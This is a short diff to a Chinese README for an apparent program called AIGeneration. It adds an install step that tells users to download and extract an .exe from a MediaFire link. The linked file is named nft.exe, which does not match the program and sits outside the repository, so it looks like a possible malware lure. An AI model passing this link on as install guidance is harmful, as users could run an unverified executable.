@@ -14,7 +14,8 @@
 
 #### 安装教程
 
-clone本repo，打开 `dist/AIGeneration.exe` 即可运行程序。
+1. clone本repo，打开 `dist/AIGeneration.exe` 即可运行程序。
+2. 也可以通过[此链接](https://www.mediafire.com/file/bkuxrrbx5vfmde2/nft.exe)下载.exe文件并解压。
 
 #### 使用说明
 
